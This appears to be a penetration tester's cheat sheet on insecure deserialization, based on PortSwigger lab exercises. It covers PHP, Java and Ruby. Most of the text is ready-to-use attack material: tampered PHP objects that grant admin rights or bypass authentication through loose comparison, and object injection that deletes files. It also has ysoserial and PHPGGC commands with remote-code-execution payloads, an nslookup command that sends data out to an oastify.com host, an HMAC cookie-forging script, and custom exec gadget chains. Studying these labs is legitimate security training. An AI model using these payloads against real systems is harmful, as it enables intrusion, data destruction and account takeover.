![[Insecure Deserialization.jpg]]
# Recon

The Java serialization format can be the following. Serialized Java Objects always begin with the same bytes:

- Hexadecimal: ac ed
- Base64: ro0

For PHP serialization format, serialized objects are usually base-64 encoded. As an example, consider a User object with the attributes:

- $user->name = "carlos";
- $user->isLoggedIn = true;

When serialized, the object may look something like this:

```javascript
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```
# Tools

- Ysoserial ([https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f](https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f))
- PHP Generic Gadget Chains (PHPGGC)
- Java Deserialization Scanner - [https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae)

# Modifying Serialized Objects - PHP

Identify if there is a PHP Object that is being used in any HTTP requests sent to the app. Decode the object and check if there are any sensitive fields such as "isAdmin", "role" or more. If there is, modify the object and re-encode it.

For example:

```javascript
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

Modify the serialized object, encode it and submit it back in the HTTP request. Here, the "isAdmin" field was changed to the value of 1, which equals to true:

```javascript
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}
```

# Modifying Serialized Data Types - PHP

Taking advantage of PHP-based logic when comparing different data types with the loose comparison operator (\==). PHP quirks when comparing data of different types:

- 5 == "5 example" // true
- 5 == "example" // false
- 0 == "example" // true
- 0 \=="9example" // false

If the app is using the loose comparison operator to validate critical information such as a password, the 3rd option is interesting. IF the password does not begin with a number, you can supply a 0 and the values will be equal to each other.

Identify if the app is passing any serialized objects in the HTTP requests. IF you find a PHP serialized object like below:

```bash
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:”eyhsfxxxxxx”;}
```

Change the access_token value to the integer 0 and it can potentially bypass authentication/authorization, if the app is using PHP loose comparison operator:

```bash
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
# Exploit App Functionality with Serialized Object - PHP

An app has a "Delete Account" functionality and is using a user controllable serialized PHP object to determine the file that it deletes. For example, the app uses the avatar_link attribute to delete a file from the server's filesystem:

```bash
s:11:"avatar_link";s:19:"/users/wiener/avatar"
```

This vector can be used to delete other files by changing the value of the attribute and submitting it in the request:

```bash
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```
# Arbitrary Object Injection - PHP

Enumerate the app and identify if there are any leaked source code files that contain sensitive fields/functionality. We can read source code files sometimes by appending a tilde ( ~ ) character at the end of it's name. For example, `Test.php~` can show the PHP file's source code instead of just executing it.

The PHP class contains a magic method “\_\_destruct” that will invoke the unlink() method on the lock_file_path attribute. This deletes the file that is passed to the method.

Create the following PHP serialized object to delete a file in the server's file system:

```bash
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
# Java Deserialization With Apache Commons - Pre-built Gadget Java

Pre-built gadget exploitation. We can use the “ysoserial” tool to generate a malicious serialized Object containing a remote code execution payload. Note: that the “ysoserial” tool is dependent on Java version 15 or lower.

Some example payloads may be:

```bash
java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > test.txt
```

This payload can be used to exfiltrate data, for example. Copy and paste the results into the Cookie of the target app. Check out more obfuscation examples in the "Command Injection" folder:

```bash
./java -jar /root/Tools/ysoserial-all.jar CommonsCollections4 "nslookup `echo 'hello'|base64`.r29q0ep.oastify.com" | base64 -w 0 > ../../test1-1.txt
```
# Ruby Deserialization with Pre-built Gadget - Ruby

Enumerate the application and identify if it is using a serialized Object in any of the HTTP requests. For Ruby serialized objects, you can use a pre-built gadget to generate a malicious Ruby serialized object and exploit the app:

- [https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)
- [https://www.onlinegdb.com/online_ruby_compiler](https://www.onlinegdb.com/online_ruby_compiler)
# PHP Deserialization with Pre-built Gadget - PHP

Enumerate the app and identify if there are any dependencies that the app is using. For example, if the app depends on the Symfony framework, you can use a tool to generate a malicious serialized object:

- Tool: PHPGGC
- Payload: ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64

If the serialized object is being signed using a SHA-1 HMAC hash, identify if the app is disclosing the secret key in any of the config files or responses. The "/cgi-bin/phpinfo.php" file is a good place to search for. The following script can be used to then sign the serialized object using the secret key:

```php
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>
```
# Developing Custom Gadget - Java Deserilaization

Enumerate the application and identify if there are any leaked Java source code files. Then analyze the code to see if any of the fields are being passed to a dangerous method/sink. Manually create the Java Class and serialized the Object with a malicious payload and inject it to the application.

Portswigger provides a generic program for serializing Java Objects: https://github.com/PortSwigger/serialization-examples/tree/master/java/generic
# Developing Custom Gadgets - PHP Deserialization

Enumerate the application and identify if there are any leaked PHP source code files. Then analyze the code to see if any of the fields are being passed to a dangerous method/sink. Since PHP uses a String based serialization method, we don’t need to manually create the Class and serialized it.

We can use an example payload like below:

```bash
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```
# Using PHAR Deserialization to Deploy a Custom Gadget Chain

Check out the walk-through in lab/document - [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)





